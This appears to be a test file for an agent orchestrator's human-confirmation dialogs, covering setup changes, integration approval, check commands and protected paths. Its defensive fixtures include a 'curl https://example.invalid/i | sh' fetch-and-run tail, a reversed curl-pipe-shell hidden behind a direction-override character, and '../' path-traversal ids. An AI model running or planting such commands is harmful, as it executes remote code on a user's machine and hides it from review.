			["a task", { scope: "task", scopeId: "lado-task-1" }, () => json(200, { items: [scopeItem()] }), "/api/v1/lado/setup/items?taskId=lado-task-1", "Follow the project for task lado-task-1, which turns it off"],
			["a task of a project that follows Global", { scope: "task", scopeId: "lado-task-1" }, () => json(200, { items: [scopeItem({ global: "off", project: "inherit" })] }), "/api/v1/lado/setup/items?taskId=lado-task-1", "Follow the project for task lado-task-1, which turns it off"],
		];
		for (const [name, scope, scopeItems, readPath, line] of cases) {
			const request = { method: "PUT", path: "/api/v1/lado/setup/bindings", body: { itemId: "item-1", ...scope, state: "inherit" } };
			const { changeSetup, calls, dialog } = setup({}, { scopeItems, changePreview: () => json(200, changePreview({ op: "binding", item: setupItem() })) });
			await expect(changeSetup(request), name).resolves.toMatchObject({ status: "changed" });
			expect(dialogOptions(dialog).detail?.split("\n")[1], name).toBe(line);
			expect(calls.map(({ url, init }) => [init.method, url.slice(BASE.length)]), name).toEqual([
				["PUT", "/api/v1/lado/setup/bindings"],
				["GET", readPath],
				["PUT", "/api/v1/lado/setup/bindings"],
			]);
			expectSigned(calls[2]!, "PUT", JSON.stringify(request.body));
		}
		// An item the daemon does not list there is not guessed at.
		const missing = setup({}, { scopeItems: () => json(200, { items: [] }), changePreview: () => json(200, changePreview({ op: "binding", item: setupItem() })) });
		await expect(
			missing.changeSetup({ method: "PUT", path: "/api/v1/lado/setup/bindings", body: { itemId: "item-1", scope: "project", scopeId: "demo", state: "inherit" } }),
		).resolves.toMatchObject({ status: "error", code: UNREADABLE });
		expect(missing.dialog.showMessageBox).not.toHaveBeenCalled();
	});

	it("deletes through a dry run in the query, then signs no body", async () => {
		const path = `${itemsPath}/item-1`;
		const { changeSetup, calls, dialog } = setup({}, { changePreview: () => json(200, changePreview({ op: "delete", item: setupItem() })) });
		await expect(changeSetup({ method: "DELETE", path, body: {} })).resolves.toMatchObject({ status: "changed" });
		expect(calls.map(({ url, init }) => [init.method, url.slice(BASE.length)])).toEqual([
			["DELETE", `${path}?dryRun=true`],
			["DELETE", path],
		]);
		expect(calls[0]!.init.body).toBeUndefined();
		expectSigned(calls[1]!, "DELETE", "");
		expect(dialogOptions(dialog).detail?.split("\n").slice(0, 2)).toEqual(["Claude Code · MCP server · search", "Delete this item"]);
	});

	it("quotes the content it signs and counts the blocking conflicts it adds", async () => {
		const text = `{\n  "PreToolUse": [\n    { "matcher": "Bash", "hooks": [{ "command": "check.sh" }] }\n  ]\n}\u202e${"x".repeat(400)}`;
		const preview = changePreview({
			op: "edit",
			item: setupItem(),
			after: { contentKind: "json", executable: false, files: [], sha256: "f".repeat(64), size: text.length, text },
			conflictsAdded: [
				{ acceptanceId: "", code: "LADO_SETUP_DENIES_AO", contentSha256: "", detail: "", details: {}, itemId: "item-1", path: "", severity: "blocking" },
				{ acceptanceId: "", code: "LADO_SETUP_DENIES_GIT", contentSha256: "", detail: "", details: {}, itemId: "item-1", path: "", severity: "warning" },
			],
		});
		const { changeSetup, dialog } = setup({}, { changePreview: () => json(200, preview) });
		await changeSetup({ method: "PATCH", path: `${itemsPath}/item-1`, body: { baseVersion: 2, content: { PreToolUse: [] } } });
		const [, , content, blocking] = dialogOptions(dialog).detail?.split("\n\n") ?? [];
		const quoted = `{ "PreToolUse": [ { "matcher": "Bash", "hooks": [{ "command": "check.sh" }] } ] } ${"x".repeat(400)}`;
		// One line of the daemon's own content, without the direction override, cut at 300 characters.
		expect(content).toBe(`Content: ${quoted.slice(0, 300)}…`);
		expect(blocking).toBe("Blocking conflicts this change adds: 1. LADO tasks stay blocked until you turn off or fix the items that cause them.");
	});

	it("gives a sent change whose answer it cannot read a code", async () => {
		const { changeSetup } = setup({}, { change: () => json(200, { applied: false }) });
		await expect(changeSetup(create)).resolves.toEqual({
			status: "error",
			code: UNREADABLE,
			message: "The change was sent, but the AO daemon's answer could not be read.",
		});
	});

	it("refuses a request that is not a change it confirms, before asking the daemon", async () => {
		const binding = { itemId: "item-1", scope: "global", state: "on" };
		for (const input of [
			null,
			{},
			{ ...create, method: "PUT" },
			{ ...create, path: "/api/v1/lado/setup/items/../rules" },
			{ ...create, path: "/api/v1/lado/rules" },
			{ ...create, body: undefined },
			{ ...create, body: { ...create.body, dryRun: false } },
			{ ...create, body: { ...create.body, extra: true } },
			{ ...create, body: { ...create.body, tool: "cursor" } },
			{ ...create, body: { ...create.body, kind: "plugin" } },
			{ ...create, body: { ...create.body, name: "" } },
			{ ...create, body: { tool: "claude-code", kind: "mcp_server", name: "search" } },
			{ method: "PATCH", path: `${itemsPath}/item-1`, body: { baseVersion: 0, content: "text" } },
			{ method: "PATCH", path: `${itemsPath}/item 1`, body: { baseVersion: 2, content: "text" } },
			{ method: "DELETE", path: `${itemsPath}/item-1`, body: { dryRun: true } },
			{ method: "DELETE", path: `${itemsPath}/item-1/drift`, body: {} },
			{ method: "PUT", path: "/api/v1/lado/setup/bindings", body: { ...binding, state: "force_on" } },
			{ method: "PUT", path: "/api/v1/lado/setup/bindings", body: { ...binding, state: "inherit" } },
			{ method: "PUT", path: "/api/v1/lado/setup/bindings", body: { ...binding, scopeId: "demo" } },
			{ method: "PUT", path: "/api/v1/lado/setup/bindings", body: { ...binding, scope: "project", scopeId: "demo", state: "on" } },
			{ method: "PUT", path: "/api/v1/lado/setup/bindings", body: { ...binding, scope: "task", scopeId: "", state: "inherit" } },
			{ method: "PUT", path: "/api/v1/lado/setup/bindings", body: { ...binding, scope: "project", scopeId: "../demo", state: "force_on" } },
			{ method: "PUT", path: "/api/v1/lado/setup/bindings", body: { ...binding, itemId: "../item" } },
			{ method: "POST", path: `${itemsPath}/item-1/drift`, body: { action: "revert" } },
			{ method: "POST", path: `${itemsPath}/item-1/drift`, body: { action: "keep", sha256: "D".repeat(64) } },
			{ method: "POST", path: "/api/v1/lado/setup/conflicts/acceptances", body: { itemId: "item-1", code: "LADO_SETUP_DENIES_GIT", scope: "global" } },
		]) {
			const { changeSetup, dialog, fetch } = setup();
			await expect(changeSetup(input), JSON.stringify(input)).resolves.toMatchObject({
				status: "error",
				code: "LADO_SETUP_CHANGE_INVALID",
			});
			expect(fetch).not.toHaveBeenCalled();
			expect(dialog.showMessageBox).not.toHaveBeenCalled();
		}
		const untrusted = setup();
		await expect(untrusted.changeSetup(create, { id: 99 })).resolves.toMatchObject({ code: "LADO_PRESENCE_UNTRUSTED_SENDER" });
		expect(untrusted.fetch).not.toHaveBeenCalled();
	});

	it("does not ask about a preview of another item or another change", async () => {
		const edit = { method: "PATCH", path: `${itemsPath}/item-1`, body: { baseVersion: 2, content: "text" } };
		const unreadable: [string, Record<string, unknown>, Route, string | undefined][] = [
			["another item", edit, () => json(200, changePreview({ op: "edit", item: setupItem({ id: "item-2" }) })), UNREADABLE],
			["another name", create, () => json(200, changePreview({ item: setupItem({ id: "", name: "other" }) })), UNREADABLE],
			["another op", create, () => json(200, changePreview({ op: "edit" })), UNREADABLE],
			["an applied change", create, () => json(200, changePreview({ applied: true })), UNREADABLE],
			["no change hash", create, () => json(200, changePreview({ changeSha256: "" })), UNREADABLE],
			[
				"a refused change",
				edit,
				() => json(409, { error: "conflict", code: "LADO_SETUP_FOLDER_ITEM", message: "This item is a folder.", details: { name: "review" } }),
				"LADO_SETUP_FOLDER_ITEM",
			],
		];
		for (const [name, request, changePreviewRoute, code] of unreadable) {
			const { changeSetup, calls, dialog } = setup({}, { changePreview: changePreviewRoute });
			const result = await changeSetup(request);
			expect(result, name).toMatchObject({ status: "error" });
			expect(result.status === "error" ? result.code : "", name).toBe(code);
			expect(dialog.showMessageBox, name).not.toHaveBeenCalled();
			expect(calls, name).toHaveLength(1);
		}
	});

	it("sends nothing when the human cancels", async () => {
		const { changeSetup, calls, dialog } = setup();
		dialog.showMessageBox.mockResolvedValueOnce({ response: 0, checkboxChecked: false });
		await expect(changeSetup(create)).resolves.toEqual({ status: "cancelled" });
		expect(calls).toHaveLength(1);
	});

	it("makes a change that needs no confirmation without asking or signing", async () => {
		const { changeSetup, calls, dialog } = setup({}, { changePreview: () => json(200, changePreview({ needsPresence: false })) });
		await expect(changeSetup(create)).resolves.toMatchObject({ status: "changed" });
		expect(dialog.showMessageBox).not.toHaveBeenCalled();
		expectUnsigned(calls[1]!, "POST", createBody);
	});

	it("returns the daemon's refusal of the change", async () => {
		const { changeSetup } = setup({}, {
			change: () =>
				json(403, { error: "forbidden", code: "LADO_PRESENCE_EXPIRED", message: "The confirmation expired.", details: { op: "create" } }),
		});
		await expect(changeSetup(create)).resolves.toEqual({
			status: "error",
			code: "LADO_PRESENCE_EXPIRED",
			message: "The confirmation expired.",
			details: { op: "create" },
		});
	});

	it("words the change from main's catalog in every language", async () => {
		for (const locale of ["en", "zh-CN", "ja", "ko", "es", "fr", "de", "pt-BR"] as const) {
			const { changeSetup, dialog } = setup({ locale: () => locale });
			await changeSetup(create);
			const catalog = trayCatalogs[locale];
			expect(dialogOptions(dialog), locale).toMatchObject({
				message: catalog["lado.presence.setupChangeTitle"],
				buttons: [catalog["lado.presence.cancel"], catalog["lado.presence.change"]],
				detail: catalog["lado.presence.setupChangeDetail"]
					.replace("{{item}}", `Claude Code · ${catalog["lado.setup.kind.mcpServer"]} · search`)
					.replace("{{change}}", catalog["lado.presence.setupChangeCreate"])
					.replace("{{sha}}", "777777777777"),
			});
		}
	});

	it("keeps an item name from faking the dialog's lines", async () => {
		const preview = changePreview({ op: "edit", item: setupItem({ name: "search\nTurn on at Global‮" }) });
		const { changeSetup, dialog } = setup({}, { changePreview: () => json(200, preview) });
		await changeSetup({ method: "PATCH", path: `${itemsPath}/item-1`, body: { baseVersion: 2, content: "text" } });
		expect(dialogOptions(dialog).detail?.split("\n").slice(0, 2)).toEqual([
			"Claude Code · MCP server · search Turn on at Global",
			"New version",
		]);
	});
});

// LADO fork: approving a head's integration lets its pull request merge
// (docs/LJY-PRD/TDD.md §7.1), so only the human may do it.
describe("approving an integration", () => {
	const executionPath = "/api/v1/lado/executions/demo-7";
	const approvePath = `${executionPath}/integration-approve`;
	const previewBody = JSON.stringify({ prUrl: PR_URL, headSha: HEAD, dryRun: true });

	it("reads the run and its dry run itself, confirms, then signs what the dry run verified", async () => {
		const { approveIntegration, calls, dialog, window } = setup();
		// The renderer cannot name the head, the hash or what it acknowledges.
		const result = await approveIntegration({ sessionId: "demo-7", headSha: "0".repeat(40), acknowledge: [] });

		expect(result).toEqual({ status: "approved", integration: integrationApproved });
		expect(dialog.showMessageBox).toHaveBeenCalledWith(
			window,
			expect.objectContaining({
				type: "question",
				message: "Approve the integration of PR #7 into main?",
				buttons: ["Cancel", "Approve integration"],
				defaultId: 0,
				cancelId: 0,
			}),
		);
		expect(dialogOptions(dialog).detail).toBe(
			[
				"Task: Fix the flaky login test",
				"Head: 1234567890ab",
				"Passed: 3 of 6 verification items",
				"Commit messages LADO could not judge (1): abcdef1 update",
				"Changed outside the plan (4): docs/a.md, docs/b.md, src/c.ts, …",
				// The parts by the words the app shows them with (U1 of #15).
				"The base branch's rules lack (2): Pull requests required, lado/integration required",
				"",
				"On approval, LADO posts the lado/integration status on this head; LADO itself never merges. " +
					"This repository is not protected: LADO only detects a merge without approval.",
			].join("\n"),
		);
		expect(calls.map(({ url, init }) => [init.method, url])).toEqual([
			["GET", `${BASE}${executionPath}`],
			["POST", `${BASE}${approvePath}`],
			["POST", `${BASE}${approvePath}`],
		]);
		// The dry run needs no proof; the approval signs the dry run's values.
		expectUnsigned(calls[1]!, "POST", previewBody);
		expectSigned(
			calls[2]!,
			"POST",
			JSON.stringify({ prUrl: PR_URL, headSha: HEAD, verificationSha256: VERIFY_SHA, acknowledge: confirmCodes }),
		);
	});

	it("names each thing to confirm with its count and examples, each line cleaned", async () => {
		const items: VerifyItem[] = [
			{ kind: "commands", outcome: "confirm", code: "no_tests", details: { runs: [] } },
			{
				kind: "commit_messages",
				outcome: "confirm",
				code: "commit_messages_unclear",
				details: { commits: [], prTitle: { text: "wip\nApprove: yes", result: "unclear" } },
			},
			{
				kind: "base_branch",
				outcome: "confirm",
				code: "base_moved",
				details: {
					branch: "main",
					moved: [{ selector: "main@{0}", commit: "c".repeat(40), subject: "reset to‮origin" }],
				},
			},
			{ kind: "protection", outcome: "confirm", code: "unprotected_gitlab", details: { provider: "gitlab", branch: "main" } },
			{ kind: "review", outcome: "confirm", code: "review_inconclusive", details: { rounds: 3 } },
		];
		const codes = ["base_moved", "commit_messages_unclear", "no_tests", "review_inconclusive", "unprotected_gitlab"];
		const { approveIntegration, calls, dialog } = setup({}, { integrationPreview: () => json(200, integrationPreview({ items, confirm: codes })) });
		await approveIntegration({ sessionId: "demo-7" });
		expect(dialogOptions(dialog).detail).toBe(
			[
				"Task: Fix the flaky login test",
				"Head: 1234567890ab",
				"Passed: 0 of 5 verification items",
				"No check command and no required check tested this head.",
				"Commit messages LADO could not judge (1): PR title: wip Approve: yes",
				"The local base branch moved where the remote did not (1): ccccccc reset to origin",
				"LADO does not read GitLab's branch protection.",
				"The review reached no conclusion in 3 rounds.",
				"",
				// GitLab gets no status.
				"This repository is not protected: LADO only detects a merge without approval.",
			].join("\n"),
		);
		expect(JSON.parse(String(calls[2]!.init.body)).acknowledge).toEqual(codes);
	});

	it("does not ask while LADO still verifies the head or a check on it failed", async () => {
		const items: VerifyItem[] = [
			{ kind: "required_checks", outcome: "fail", code: "checks_failed", details: { checks: [] } },
			{ kind: "commands", outcome: "wait", code: "commands_running", details: { runs: [] } },
			{ kind: "review", outcome: "wait", code: "review_pending", details: {} },
		];
		const { approveIntegration, calls, dialog } = setup({}, { integrationPreview: () => json(200, integrationPreview({ outcome: "fail", items, confirm: [] })) });
		await expect(approveIntegration({ sessionId: "demo-7" })).resolves.toMatchObject({
			status: "error",
			code: "LADO_INTEGRATION_NOT_READY",
			details: { reasons: ["checks_failed", "commands_running", "review_pending"] },
		});
		expect(dialog.showMessageBox).not.toHaveBeenCalled();
		expect(calls.map(({ init }) => init.method)).toEqual(["GET", "POST"]);
	});

	it("does not ask about a run without an open pull request, a head LADO has not seen or one approved already", async () => {
		const cases: [Partial<ExecutionResponse>, string][] = [
			[{ pr: undefined }, "LADO_EXECUTION_NO_PR"],
			[{ pr: { closed: false, merged: true, number: 7, url: PR_URL, headSha: HEAD } }, "LADO_EXECUTION_NO_PR"],
			[{ pr: { closed: true, merged: false, number: 7, url: PR_URL, headSha: HEAD } }, "LADO_EXECUTION_NO_PR"],
			[{ pr: { closed: false, merged: false, number: 7, url: PR_URL } }, "LADO_INTEGRATION_NOT_READY"],
			[{ integration: integrationApproved.approval }, "LADO_INTEGRATION_ALREADY_APPROVED"],
		];
		for (const [overrides, code] of cases) {
			const { approveIntegration, calls, dialog } = setup({}, { execution: () => json(200, executionResponse(overrides)) });
			await expect(approveIntegration({ sessionId: "demo-7" }), code).resolves.toMatchObject({ status: "error", code });
			expect(dialog.showMessageBox).not.toHaveBeenCalled();
			expect(calls.map(({ init }) => init.method)).toEqual(["GET"]);
		}
	});

	it("sends nothing when the human cancels", async () => {
		const { approveIntegration, calls, dialog } = setup();
		dialog.showMessageBox.mockResolvedValueOnce({ response: 0, checkboxChecked: false });
		await expect(approveIntegration({ sessionId: "demo-7" })).resolves.toEqual({ status: "cancelled" });
		// Only the read and the dry run, which needs no proof.
		expect(calls.map(({ init }) => init.method)).toEqual(["GET", "POST"]);
		expectUnsigned(calls[1]!, "POST", previewBody);
	});

	it("refuses an untrusted sender and an invalid session id", async () => {
		for (const [input, sender, code] of [
			[{ sessionId: "demo-7" }, { id: 99 }, "LADO_PRESENCE_UNTRUSTED_SENDER"],
			[{ sessionId: "../demo" }, undefined, "LADO_SESSION_ID_INVALID"],
			[{ sessionId: "" }, undefined, "LADO_SESSION_ID_INVALID"],
			[null, undefined, "LADO_SESSION_ID_INVALID"],
		] as const) {
			const { approveIntegration, dialog, fetch } = setup();
			await expect(approveIntegration(input, sender ?? undefined), code).resolves.toMatchObject({ status: "error", code });
			expect(fetch).not.toHaveBeenCalled();
			expect(dialog.showMessageBox).not.toHaveBeenCalled();
		}
	});

	it("does not ask about a dry run of another head and returns the daemon's refusals", async () => {
		const other = setup({}, { integrationPreview: () => json(200, integrationPreview({ headSha: "e".repeat(40) })) });
		await expect(other.approveIntegration({ sessionId: "demo-7" })).resolves.toMatchObject({ status: "error", code: UNREADABLE });
		expect(other.dialog.showMessageBox).not.toHaveBeenCalled();

		const moved = {
			error: "conflict",
			code: "LADO_INTEGRATION_HEAD_CHANGED",
			message: "The pull request has a new head.",
			details: { headSha: HEAD, currentHeadSha: "e".repeat(40) },
		};
		const refusedPreview = setup({}, { integrationPreview: () => json(409, moved) });
		await expect(refusedPreview.approveIntegration({ sessionId: "demo-7" })).resolves.toEqual({
			status: "error",
			code: moved.code,
			message: moved.message,
			details: moved.details,
		});
		expect(refusedPreview.dialog.showMessageBox).not.toHaveBeenCalled();

		const changed = { error: "conflict", code: "LADO_VERIFICATION_CHANGED", message: "The verification changed." };
		const refused = setup({}, { integration: () => json(409, changed) });
		await expect(refused.approveIntegration({ sessionId: "demo-7" })).resolves.toEqual({
			status: "error",
			code: changed.code,
			message: changed.message,
		});
	});

	// Review fixes of #15: rules LADO could not read may protect the branch
	// (U4), a check from one app only cannot be LADO's (Q3), and a deleted
	// local base branch is named (V7).
	it("words protection and the base branch as they stand", async () => {
		const withItem = (item: VerifyItem) => confirmItems.map((other) => (other.kind === item.kind ? item : other));
		const detailOf = async (items: VerifyItem[], confirm: string[]) => {
			const { approveIntegration, dialog } = setup({}, { integrationPreview: () => json(200, integrationPreview({ items, confirm })) });
			await approveIntegration({ sessionId: "demo-7" });
			return dialogOptions(dialog).detail ?? "";
		};
		const unknown = await detailOf(
			withItem({
				kind: "protection",
				outcome: "confirm",
				code: "protection_unknown",
				details: { provider: "github", repo: "acme/demo", branch: "main", missing: [], errorClass: "http_502", error: "the host answered 502" },
			}),
			["commit_messages_unclear", "outside_plan", "protection_unknown"],
		);
		expect(unknown).toContain("LADO could not read the base branch's rules: the host answered 502");
		expect(unknown).not.toContain("This repository is not protected");

		const appBound = await detailOf(
			withItem({
				kind: "protection",
				outcome: "confirm",
				code: "unprotected",
				details: { provider: "github", repo: "acme/demo", branch: "main", missing: ["required_status_checks:lado/integration:any_source"] },
			}),
			confirmCodes,
		);
		expect(appBound).toContain("The base branch's rules lack (1): lado/integration from any source");
		expect(appBound).toContain("set the check's source to “Any source”");
		expect(appBound).toContain("This repository is not protected");

		const deleted = await detailOf(
			withItem({
				kind: "base_branch",
				outcome: "confirm",
				code: "base_deleted",
				details: { branch: "main", remote: "origin", moved: [], alreadyOnBase: false, dispatchCommit: "c".repeat(40), deleted: true },
			}),
			["base_deleted", ...confirmCodes],
		);
		expect(deleted).toContain("The local main was at ccccccc when the run started and is gone now.");
	});

	it("words the confirmation from main's catalog in the current language", async () => {
		const { approveIntegration, dialog } = setup({ locale: () => "ko" });
		await approveIntegration({ sessionId: "demo-7" });
		const ko = trayCatalogs.ko;
		const options = dialogOptions(dialog);
		expect(options.message).toBe(ko["lado.presence.integration.title"].replace("{{number}}", "7").replace("{{branch}}", "main"));
		expect(options.buttons).toEqual([ko["lado.presence.cancel"], ko["lado.presence.integration.approve"]]);
		expect(options.detail?.split("\n")[0]).toBe(ko["lado.presence.integration.task"].replace("{{task}}", "Fix the flaky login test"));
		expect(options.detail).toContain(ko["lado.presence.integration.nextUnprotected"]);
	});
});

// LADO fork: a project's check commands run outside any agent sandbox, so
// only the human may change them.
describe("changing check commands", () => {
	const settingsPath = "/api/v1/lado/projects/demo/settings";
	const current = [
		{ name: "test", command: "npm test" },
		{ name: "lint", command: "npm run lint" },
	];
	const withCommands = (checkCommands: { name: string; command: string }[]) => ({ ...settingsResponse(), checkCommands });

	it("names the commands added, changed and removed, then signs a change of the commands only", async () => {
		const next = [
			{ name: "lint", command: "npm run lint -- --max-warnings 0" },
			{ name: "build", command: "npm run build  &&  npm run e2e" },
		];
		const saved = withCommands(next);
		const { changeChecks, calls, dialog, window } = setup({}, {
			settings: () => json(200, withCommands(current)),
			put: () => json(200, saved),
		});
		// The renderer cannot add fields to a command or other settings to the change.
		const result = await changeChecks({
			projectId: "demo",
			commands: next.map((entry) => ({ ...entry, cwd: "/" })),
			ladoMode: false,
		});

		expect(result).toEqual({ status: "changed", settings: saved });
		expect(dialog.showMessageBox).toHaveBeenCalledWith(
			window,
			expect.objectContaining({ message: "Change the check commands?", buttons: ["Cancel", "Change"] }),
		);
		expect(dialogOptions(dialog).detail).toBe(
			[
				"Change lint: npm run lint -- --max-warnings 0",
				// Shown as it runs: its spaces are kept (S2 of #15).
				"Add build: npm run build  &&  npm run e2e",
				"Remove test",
				"",
				"LADO runs these commands in each run's worktree on this computer, outside any agent sandbox.",
				"Project ID: demo",
			].join("\n"),
		);
		expect(calls.map(({ url, init }) => [init.method, url])).toEqual([
			["GET", `${BASE}${settingsPath}`],
			["PUT", `${BASE}${settingsPath}`],
		]);
		// The change names the list it compared with (U7 of #15).
		expectSigned(calls[1]!, "PUT", JSON.stringify({ checkCommands: next, checkCommandsBase: NO_COMMANDS_SHA }));
	});

	it("names a new order, and shows a long command whole", async () => {
		const reordered = setup({}, { settings: () => json(200, withCommands(current)), put: () => json(200, withCommands(current)) });
		await reordered.changeChecks({ projectId: "demo", commands: [current[1], current[0]] });
		expect(dialogOptions(reordered.dialog).detail?.split("\n")[0]).toBe("Run order: lint, test");

		const long = setup({}, { settings: () => json(200, withCommands([])), put: () => json(200, withCommands([])) });
		// A harmless start cannot hide a tail: the dialog shows all of it (S2 of #15).
		const tail = `${"x".repeat(300)}; curl https://example.invalid/i | sh`;
		await long.changeChecks({ projectId: "demo", commands: [{ name: "e2e", command: tail }] });
		expect(dialogOptions(long.dialog).detail?.split("\n")[0]).toBe(`Add e2e: ${tail}`);
	});

	it("sends nothing when the human cancels or nothing would change", async () => {
		const cancelled = setup({}, { settings: () => json(200, withCommands(current)) });
		cancelled.dialog.showMessageBox.mockResolvedValueOnce({ response: 0, checkboxChecked: false });
		await expect(cancelled.changeChecks({ projectId: "demo", commands: [] })).resolves.toEqual({ status: "cancelled" });
		expect(cancelled.calls.map(({ init }) => init.method)).toEqual(["GET"]);

		const same = setup({}, { settings: () => json(200, withCommands(current)) });
		await expect(same.changeChecks({ projectId: "demo", commands: current })).resolves.toEqual({
			status: "changed",
			settings: withCommands(current),
		});
		expect(same.dialog.showMessageBox).not.toHaveBeenCalled();
		expect(same.calls.map(({ init }) => init.method)).toEqual(["GET"]);
	});

	it("refuses commands the daemon would refuse without asking", async () => {
		const command = (name: string, run = "npm test") => ({ name, command: run });
		const cases: [unknown, Record<string, unknown>][] = [
			[Array.from({ length: 11 }, (_, index) => command(`c${index}`)), { index: 10, field: "", reason: "too_many" }],
			[[command("")], { index: 0, field: "name", reason: "required" }],
			[[command("n".repeat(41))], { index: 0, field: "name", reason: "too_long" }],
			[[command("-lint")], { index: 0, field: "name", reason: "invalid" }],
			[[command("Test"), command("test")], { index: 1, field: "name", reason: "duplicate" }],
			[[command("test", "  ")], { index: 0, field: "command", reason: "required" }],
			[[command("test", "x".repeat(2001))], { index: 0, field: "command", reason: "too_long" }],
			// One command is one line, without direction controls (S2 of #15).
			[[command("test", "npm\0test")], { index: 0, field: "command", reason: "control_character", position: 4, character: "U+0000" }],
			[[command("build", "npm run build\nnpm run e2e")], { index: 0, field: "command", reason: "control_character", position: 14, character: "U+000A" }],
			[[command("build", "make\tall")], { index: 0, field: "command", reason: "control_character", position: 5, character: "U+0009" }],
			[[command("build", "make\u2028all")], { index: 0, field: "command", reason: "control_character", position: 5, character: "U+2028" }],
			[[command("build", "make all #\u202ehs | lruc")], { index: 0, field: "command", reason: "bidi_control", position: 11, character: "U+202E" }],
		];
		for (const [commands, details] of cases) {
			const { changeChecks, dialog, fetch } = setup();
			await expect(changeChecks({ projectId: "demo", commands }), JSON.stringify(details)).resolves.toMatchObject({
				status: "error",
				code: "LADO_CHECK_COMMANDS_INVALID",
				details,
			});
			expect(fetch).not.toHaveBeenCalled();
			expect(dialog.showMessageBox).not.toHaveBeenCalled();
		}
		for (const [input, sender, code] of [
			[{ projectId: "demo", commands: [] }, { id: 99 }, "LADO_PRESENCE_UNTRUSTED_SENDER"],
			[{ projectId: "../demo", commands: [] }, undefined, "LADO_PROJECT_ID_INVALID"],
		] as const) {
			const { changeChecks, fetch } = setup();
			await expect(changeChecks(input, sender ?? undefined), code).resolves.toMatchObject({ status: "error", code });
			expect(fetch).not.toHaveBeenCalled();
		}
	});
});

// LADO fork: the protected paths keep workers away from CI, agent
// instructions and LADO's own files, so only the human may change them.
describe("changing protected paths", () => {
	const rulePath = `/api/v1/lado/rules/${PATHS_RULE}`;
	const current = [".github/**", "**/CLAUDE.md", ".ao/**"];
	const changedPaths = pathsRule([".github/**", ".ao/**", "infra/**"], { version: 2, versionId: "lado-rule-version-paths-2" });

	it("names the globs added and removed, then signs the change", async () => {
		const { changeRule, calls, dialog, window } = setup({}, {
			rule: () => json(200, { rule: pathsRule(current), versions: [] }),
			patch: () => json(200, { applied: true, impact: { projects: [], tasks: [] }, rule: changedPaths }),
		});
		// The globs are trimmed; the renderer cannot pick the base version.
		const result = await changeRule({ ruleId: PATHS_RULE, paths: { globs: [" .github/** ", ".ao/**", "infra/**"] }, baseVersion: 9 });

		expect(result).toEqual({ status: "changed", rule: changedPaths });
		expect(dialog.showMessageBox).toHaveBeenCalledWith(
			window,
			expect.objectContaining({ message: "Change the protected paths?", buttons: ["Cancel", "Change"] }),
		);
		expect(dialogOptions(dialog).detail).toBe(
			"Protect: infra/**\nNo longer protect: **/CLAUDE.md\n\n" +
				"Workers may not change protected paths unless the approved plan names them. " +
				"Tasks approved under the current rules need a new approval.",
		);
		expect(calls.map(({ url, init }) => [init.method, url])).toEqual([
			["GET", `${BASE}${rulePath}`],
			["PATCH", `${BASE}${rulePath}`],
		]);
		expectSigned(calls[1]!, "PATCH", JSON.stringify({ baseVersion: 1, paths: { globs: [".github/**", ".ao/**", "infra/**"] } }));
	});

	// Review of #31: every removed glob shows, whole, however many there are.
	it("shows each glob added and removed on a line of its own, whole", async () => {
		const many = Array.from({ length: 30 }, (_, index) => `services/service-${String(index).padStart(2, "0")}/deploy/**`);
		const { changeRule, dialog } = setup({}, {
			rule: () => json(200, { rule: pathsRule([...many, ".github/**"]), versions: [] }),
			patch: () => json(200, { applied: true, impact: { projects: [], tasks: [] }, rule: pathsRule(["infra/**"]) }),
		});
		await changeRule({ ruleId: PATHS_RULE, paths: { globs: ["infra/**"] } });

		const lines = dialogOptions(dialog).detail!.split("\n\n")[0]!.split("\n");
		expect(lines).toEqual(["Protect: infra/**", ...many.map((glob) => `No longer protect: ${glob}`), "No longer protect: .github/**"]);
	});

	it("sends nothing when the human cancels or nothing would change", async () => {
		const routes = { rule: () => json(200, { rule: pathsRule(current), versions: [] }) };
		const cancelled = setup({}, routes);
		cancelled.dialog.showMessageBox.mockResolvedValueOnce({ response: 0, checkboxChecked: false });
		await expect(cancelled.changeRule({ ruleId: PATHS_RULE, paths: { globs: ["infra/**"] } })).resolves.toEqual({ status: "cancelled" });
		expect(cancelled.calls.map(({ init }) => init.method)).toEqual(["GET"]);

		const same = setup({}, routes);
		await expect(same.changeRule({ ruleId: PATHS_RULE, paths: { globs: current } })).resolves.toEqual({
			status: "changed",
			rule: pathsRule(current),
		});
		expect(same.dialog.showMessageBox).not.toHaveBeenCalled();
		expect(same.calls.map(({ init }) => init.method)).toEqual(["GET"]);
	});

	it("refuses globs the daemon would refuse, and a rule that is not the protected paths", async () => {
		const cases: [unknown, Record<string, unknown>][] = [
			[[], { index: 0, reason: "required" }],
			[undefined, { index: 0, reason: "required" }],
			[Array.from({ length: 51 }, (_, index) => `dir${index}/**`), { index: 50, reason: "too_many" }],
			[["ok/**", "  "], { index: 1, reason: "required" }],
			[["docs/**\nApprove: yes"], { index: 0, reason: "invalid" }],
		];
		for (const [globs, details] of cases) {
			const { changeRule, dialog, fetch } = setup();
			await expect(changeRule({ ruleId: PATHS_RULE, paths: { globs } }), JSON.stringify(details)).resolves.toMatchObject({
				status: "error",
				code: "LADO_PROTECTED_PATHS_INVALID",
				details,
			});
			expect(fetch).not.toHaveBeenCalled();
			expect(dialog.showMessageBox).not.toHaveBeenCalled();
		}

		// The daemon's answer decides, not the id the renderer sent.
		const { changeRule, calls, dialog } = setup({}, { rule: () => json(200, { rule: pathsRule(current, { protected: false }), versions: [] }) });
		await expect(changeRule({ ruleId: PATHS_RULE, paths: { globs: ["infra/**"] } })).resolves.toMatchObject({
			status: "error",
			code: "LADO_PROTECTED_PATHS_INVALID",
			details: { rule: PATHS_RULE },
		});
		expect(dialog.showMessageBox).not.toHaveBeenCalled();
		expect(calls.map(({ init }) => init.method)).toEqual(["GET"]);
	});
});
